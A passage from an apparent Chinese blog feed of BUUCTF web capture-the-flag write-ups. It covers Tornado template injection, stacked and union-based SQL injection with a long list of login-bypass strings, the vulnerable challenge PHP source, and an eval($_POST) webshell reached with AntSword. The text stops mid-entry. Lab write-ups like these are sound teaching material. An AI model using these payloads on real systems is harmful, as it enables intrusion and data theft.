        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>审查源代码得到</p><pre class=" language-php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string">'dog'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>    <span class="token keyword">echo</span> <span class="token string">'Syc&amp;#123;cat_cat_cat_cat&amp;#125;'</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>传入参数=dog</p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>cat<span class="token operator">=</span>dog</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网杯_2018 easy_tornado</title>
      <link href="2021/03/01/hu-wang-bei-2018-easy-tornado/"/>
      <url>2021/03/01/hu-wang-bei-2018-easy-tornado/</url>
      
        <content type="html"><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>进入三个文件</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span>flag<span class="token punctuation">.</span>txtflag in <span class="token operator">/</span>fllllllllllllagfile<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>9053c61f6b76e014b1e003957ee5b546<span class="token operator">/</span>welcome<span class="token punctuation">.</span>txtrenderfile<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>welcome<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>7d2c2069a844d7a93c2d6ee197618bd6<span class="token operator">/</span>hints<span class="token punctuation">.</span>txt<span class="token function">md5</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span><span class="token function">md5</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>hints<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>b01fb2c2497da3d0979b7965d57a95dc</code></pre><p>猜测payload</p><pre class=" language-php"><code class="language-php">file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>`<span class="token function">md5</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token operator">/</span>fllllllllllllag<span class="token punctuation">)</span><span class="token punctuation">)</span>`</code></pre><p>现在主要就是找<code>cookie_secret</code></p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用，从<code>render</code>可以猜测是模板注入</p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><pre class=" language-php"><code class="language-php">payloaderror<span class="token operator">?</span>msg<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;&amp;#123;handler.settings&amp;#125;&amp;#125;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token string">'autoreload'</span><span class="token punctuation">:</span> True<span class="token punctuation">,</span> <span class="token string">'compiled_template_cache'</span><span class="token punctuation">:</span> False<span class="token punctuation">,</span> <span class="token string">'cookie_secret'</span><span class="token punctuation">:</span> <span class="token string">'591f8ab1-795d-4d61-9975-6da84c69a663'</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre><p>用脚本跑得到filehash</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibhash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>cookie_secret<span class="token operator">=</span><span class="token string">"591f8ab1-795d-4d61-9975-6da84c69a663"</span>hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">610463dc2fc8906a2682dd82ca291cec</span></code></pre><p>最终payload</p><pre class=" language-php"><code class="language-php">file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>610463dc2fc8906a2682dd82ca291cec</code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_2019 EasySQL</title>
      <link href="2021/03/01/suctf-2019-easysql/"/>
      <url>2021/03/01/suctf-2019-easysql/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>打开源码得到</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>此处post传参，参数名query</p><pre class=" language-php"><code class="language-php">query<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">11</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//回显点貌似只有一个</span></code></pre><p>这道waf过滤了太多关键词了，又想到堆叠注入</p><pre class=" language-php"><code class="language-php">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>show databases<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> ctf <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> ctftraining <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> information_schema <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> mysql <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> performance_schema <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> test <span class="token punctuation">)</span></code></pre><pre class=" language-php"><code class="language-php">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>show tables<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> Flag <span class="token punctuation">)</span></code></pre><p>猜测flag在Flag表里</p><pre class=" language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//不知道哪儿来的源码</span></code></pre><p>这里就转为对||的处理</p><p>第一种直接用*查询全部</p><pre class=" language-php"><code class="language-php">payloadquery<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">//select *,1||flag from Flag  等效于select *,1 from Flag</span></code></pre><p>第二种 使用<code>set sql_mode=PIPES_AS_CONCAT;</code>将||视为字符串的连接操作符而非或运算符。</p><pre class=" language-php"><code class="language-php">payloadquery<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>set sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span>select <span class="token number">1</span><span class="token comment" spellcheck="true">// '||' 前面是真就会跳过后面</span><span class="token comment" spellcheck="true">//select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag</span><span class="token comment" spellcheck="true">//1||flag合并成一个单位回显</span></code></pre><p>题目源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token comment" spellcheck="true">//die();</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span></span> Give me your flag<span class="token punctuation">,</span> I will tell you <span class="token keyword">if</span> the flag is right<span class="token punctuation">.</span> <span class="token markup">&lt;/ a></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//var_dump(preg_match("/&amp;#123;$BlackList&amp;#125;/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/&amp;#123;$BlackList&amp;#125;/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token comment" spellcheck="true">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;while(@mysqli_next_result($MysqlLink));</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 EasySQL</title>
      <link href="2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>这是一道sql注入的题</p><p>进入题目  两个输入框 用户名，密码</p><p>猜测弱密码，admin passwd 不行</p><p>输入’报错  可以注入</p><p>这里可以用万能密码注入</p><p>php</p><pre class=" language-php+HTML"><code class="language-php+HTML">'or 1=1/<br/>"or "a"="a<br/>"or 1=1--<br/>"or"="<br/>"or"="a'='a<br/>"or1=1--<br/>"or=or"<br/>''or'='or'<br/>') or ('a'='a<br/>'.).or.('.a.'='.a<br/>'or 1=1<br/>'or 1=1--<br/>'or 1=1/<br/>'or"="a'='a<br/>'or' '1'='1'<br/>'or''='<br/>'or''=''or''='<br/>'or'='1'<br/>'or'='or'<br/>'or.'a.'='a<br/>'or1=1--<br/>1'or'1'='1<br/>a'or' 1=1--<br/>a'or'1=1--<br/>or 'a'='a'<br/>or 1=1--<br/>or1=1--</code></pre><p>asp</p><pre class=" language-asp"><code class="language-asp">"or "a"="a<br/>'.).or.('.a.'='.a <br/>or 1=1--<br/>'or 1=1--<br/>a'or' 1=1--<br/>"or 1=1--<br/>'or.'a.'='a<br/>"or"="a'='a<br/>'or''='<br/>or'='or'</code></pre><p>jsp</p><pre class=" language-jsp"><code class="language-jsp">    1'or'1'='1<br/>admin' or 1=1/*</code></pre><p>猜测sql语句</p><p>username=’uesrname’ and passwd=’password’</p><p>构造payload</p><pre class=" language-php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span>check<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span></code></pre><p>1后面’和前面的闭合</p><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 Knife</title>
      <link href="2021/03/01/ji-ke-da-tiao-zhan-2019-knife/"/>
      <url>2021/03/01/ji-ke-da-tiao-zhan-2019-knife/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>找菜刀，再结合这个<code>eval($_POST[&quot;Syc&quot;]);</code>后门</p><p>用蚁剑连接，密码Syc</p><p>发现flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 LoveSQL</title>
      <link href="2021/03/01/ji-ke-da-tiao-zhan-2019-lovesql/"/>
      <url>2021/03/01/ji-ke-da-tiao-zhan-2019-lovesql/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>尝试万能密码登录</p><p><code>Hello admin！Your password is &#39;1eb26772fe42a42d3ef6a247e970d1ee&#39;</code></p><pre class=" language-php"><code class="language-php">payloadcheck<span class="token punctuation">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">//登录成功，并没有什么东西</span></code></pre><p>加<code>&#39;</code>报错，经排查，没有过滤限制，直接注入</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 4 %23&amp;password=2Unknown column '</span><span class="token number">4</span><span class="token string">' in '</span><span class="token keyword">order</span> clause'</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Login Success<span class="token operator">!</span></code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,3 %23&amp;password=2Hello 2！Your password is '</span><span class="token number">3</span>'<span class="token comment" spellcheck="true">//两个回显点</span></code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,version(),database() %23&amp;password=2Hello 10.3.18-MariaDB！Your password is '</span>geek'</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1)%23&amp;password=2Hello 2！Your password is '</span>geekuser<span class="token string">'check.php?username='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'l0ve1ysq1'</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;password=2Hello 2！Your password is '</span>geekuser<span class="token punctuation">,</span>l0ve1ysq1'<span class="token comment" spellcheck="true">//一步到位</span></code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string">')%23&amp;password=2Hello 2！Your password is '</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token string">'check.php?username='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'geekuser'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'id,username,password'</span></code></pre><pre class=" 